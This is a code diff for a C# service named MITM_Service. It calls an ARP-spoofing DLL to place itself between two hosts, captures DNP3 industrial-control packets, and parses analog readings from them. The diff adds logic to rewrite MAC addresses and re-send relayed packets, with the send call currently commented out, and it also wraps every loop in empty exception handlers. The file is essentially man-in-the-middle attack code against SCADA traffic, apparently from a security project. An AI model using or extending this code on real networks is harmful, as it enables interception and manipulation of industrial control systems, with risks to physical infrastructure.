@@ -29,6 +29,9 @@ namespace MITM_Service
         [DllImport("ARPSpoof.dll", EntryPoint = "Terminate", CallingConvention = CallingConvention.Cdecl)]
         public static extern void Terminate();
 
+        [DllImport("ARPSpoof.dll", EntryPoint = "SendPacket", CallingConvention = CallingConvention.Cdecl)]
+        public static extern void SendPacket(ref SendPacketStruct packetStruct);
+
         private List<byte> hostsIPends;
         private int sniffForHostsInterval = 7;
         private bool terminate = false;
@@ -38,7 +41,8 @@ namespace MITM_Service
         private Publisher publisher;
 
         private Queue<PacketStruct> packetStructs;
-        private DataLinkHandler dNP3DataLinkHandler = new DataLinkHandler();
+        private DataLinkHandler dataLinkHandler;
+        private ApplicationHandler applicationHandler;
 
         public MITM_Service()
         {
@@ -46,12 +50,19 @@ namespace MITM_Service
             packetStructs = new Queue<PacketStruct>();
             packetLockObject = new object();
             publisher = new Publisher();
-            dNP3DataLinkHandler = new DataLinkHandler();
+            dataLinkHandler = new DataLinkHandler();
+            applicationHandler = new ApplicationHandler();
         }
 
         public void ARPSpoof(ARPSpoofParticipantsInfo participants)
         {
             terminate = false;
+
+            lock (Database.lockObject)
+            {
+                Database.ARPSpoofParticipantsInfo = participants;
+            }
+
             Task.Factory.StartNew(() => ARPSpoof(ref participants));
             Task.Factory.StartNew(() => PacketProducer());
             Task.Factory.StartNew(() => PacketConsumer());
@@ -62,113 +73,183 @@ namespace MITM_Service
             int maxPacketNum = 20;
             PacketStruct packetStruct = new PacketStruct();
 
-            while (!terminate)
+            try
             {
-                RetreivePackets(ref packetStruct);
-
-                if (packetStruct.source_addr[0] == 0)
+                while (!terminate)
                 {
+                    RetreivePackets(ref packetStruct);
+
+                    if (packetStruct.source_addr[0] == 0)
+                    {
+                        Thread.Sleep(100);
+                        continue;
+                    }
+
+                    lock (packetLockObject)
+                    {
+                        packetStructs.Enqueue(packetStruct);
+                    }
+
+                    packetStruct = new PacketStruct();
+
                     Thread.Sleep(100);
-                    continue;
                 }
-
-                lock (packetLockObject)
-                {
-                    packetStructs.Enqueue(packetStruct);
-                }
-
-                Thread.Sleep(100);
             }
+            catch (Exception e) { }
         }
 
         public void PacketConsumer()
         {
             PacketStruct packetStruct;
-
-            while (!terminate)
+            try
             {
-                if (packetStructs.Count() > 0)
+                while (!terminate)
                 {
-                    lock (packetLockObject)
+                    if (packetStructs.Count() > 0)
                     {
-                        packetStruct = packetStructs.Dequeue();
-                    }
 
-                    int offset = 54;
-
-                    byte len = packetStruct.packet[offset + 2];
-
-                    int actualLen = (byte)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc
-
-                    len -= 5; // minus header
-
-                    while (len > 0)
-                    {
-                        if (len < 16)
+                        lock (packetLockObject)
                         {
-                            // last chunk
-                            actualLen += (byte)(len + 2);
-                            break;
+                            packetStruct = packetStructs.Dequeue();
                         }
 
-                        actualLen += (byte)(16 + 2);
-                        len -= 16;
+                        int offset = 54;
+
+                        byte len = packetStruct.packet[offset + 2];
+
+                        int actualLen = (byte)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc
+
+                        len -= 5; // minus header
+
+                        while (len > 0)
+                        {
+                            if (len < 16)
+                            {
+                                // last chunk
+                                actualLen += (byte)(len + 2);
+                                break;
+                            }
+
+                            actualLen += (byte)(16 + 2);
+                            len -= 16;
+                        }
+
+                        byte[] message = new byte[actualLen];
+
+                        for (int i = 0; i < actualLen; i++)
+                        {
+                            message[i] = packetStruct.packet[offset + i];
+                        }
+
+                        List<UserLevelObject> userLevelObjects = dataLinkHandler.PackUp(message);
+
+                        if (userLevelObjects == null)
+                        {
+                            continue;
+                        }
+
+                        Task.Factory.StartNew(() => ProcessObjects(userLevelObjects));
+
+                        List<byte[]> segments = applicationHandler.PackDown(userLevelObjects, userLevelObjects[0].FunctionCode, dataLinkHandler.IsMaster, dataLinkHandler.IsPrm);
+
+                        segments[0].CopyTo(packetStruct.packet, offset);
+
+                        byte[] transmiterTarget = new byte[6];
+                        for (int i = 0; i < 6; i++)
+                        {
+                            transmiterTarget[i] = packetStruct.packet[i + 6];
+                        }
+
+                        byte[] receiverTarget;
+                        if (AreEqual(transmiterTarget, Database.ARPSpoofParticipantsInfo.Target1MACAddress))
+                        {
+                            receiverTarget = Database.ARPSpoofParticipantsInfo.Target2MACAddress;
+                        }
+                        else
+                        {
+                            receiverTarget = Database.ARPSpoofParticipantsInfo.Target1MACAddress;
+                        }
+
+                        byte[] myAddress = Database.ARPSpoofParticipantsInfo.MyMACAddress;
+
+                        receiverTarget.CopyTo(packetStruct.packet, 0);
+                        myAddress.CopyTo(packetStruct.packet, 6);
+
+                        SendPacketStruct sendPacketStruct = new SendPacketStruct();
+                        sendPacketStruct.Name = Database.GlobalConnectionInfo.Name;
+                        sendPacketStruct.Packet = packetStruct.packet;
+                        sendPacketStruct.Size = offset + actualLen;
+
+                        //Task.Factory.StartNew(() => SendPacket(ref sendPacketStruct));
+
+                        Thread.Sleep(100);
                     }
-
-                    byte[] message = new byte[actualLen];
-
-                    for (int i = 0; i < actualLen; i++)
-                    {
-                        message[i] = packetStruct.packet[offset + i];
-                    }
-                    
-                    List<UserLevelObject> userLevelObjects = dNP3DataLinkHandler.PackUp(message);
-
-                    Task.Factory.StartNew(() => ProcessObjects(userLevelObjects));
-
-                    Thread.Sleep(100);
                 }
             }
+            catch (Exception e) { }
+        }
+
+        private bool AreEqual(byte[] first, byte[] second)
+        {
+            if (first.Length != second.Length)
+            {
+                return false;
+            }
+
+            for (int i = 0; i < first.Length; i++)
+            {
+                if (first[i] != second[i])
+                {
+                    return false;
+                }
+            }
+
+            return true;
         }
 
         void ProcessObjects(List<UserLevelObject> userLevelObjects)
         {
-            foreach (UserLevelObject userObject in userLevelObjects)
+            try
             {
-                if (userObject.FunctionCode == ApplicationFunctionCodes.RESPONSE)
+
+                foreach (UserLevelObject userObject in userLevelObjects)
                 {
-                    if (!userObject.IndicesPresent)
+                    if (userObject.FunctionCode == ApplicationFunctionCodes.RESPONSE)
                     {
-                        if (userObject.RangeFieldPresent)
+                        if (!userObject.IndicesPresent)
                         {
-                            if (userObject.RangePresent)
+                            if (userObject.RangeFieldPresent)
                             {
-                                for (int i = userObject.StartIndex; i <=userObject.StopIndex; i++)
+                                if (userObject.RangePresent)
                                 {
-                                    AnalogInputPoint analogInputPoint;
-                                    if (!Database.AnalogInputPoints.TryGetValue(i, out analogInputPoint))
+                                    for (int i = userObject.StartIndex; i <= userObject.StopIndex; i++)
                                     {
-                                        analogInputPoint = new AnalogInputPoint();
+                                        AnalogInputPoint analogInputPoint;
+                                        if (!Database.AnalogInputPoints.TryGetValue(i, out analogInputPoint))
+                                        {
+                                            analogInputPoint = new AnalogInputPoint();
+
+                                            lock (Database.lockObject)
+                                            {
+                                                Database.AnalogInputPoints.Add(i, analogInputPoint);
+                                            }
+                                        }
 
                                         lock (Database.lockObject)
                                         {
-                                            Database.AnalogInputPoints.Add(i, analogInputPoint);
+                                            analogInputPoint.RawValue = BitConverter.ToInt32(userObject.Values[i], 0);
+                                            analogInputPoint.Value = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;
                                         }
-                                    }
 
-                                    lock (Database.lockObject)
-                                    {
-                                        analogInputPoint.RawValue = BitConverter.ToInt32(userObject.Values[i], 0);
-                                        analogInputPoint.Value = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;
+                                        publisher.AnalogInputChange(analogInputPoint);
                                     }
-
-                                    publisher.AnalogInputChange(analogInputPoint);
                                 }
                             }
                         }
                     }
                 }
             }
+            catch (Exception e) { }
         }
 
         public void TerminateActiveAttack()
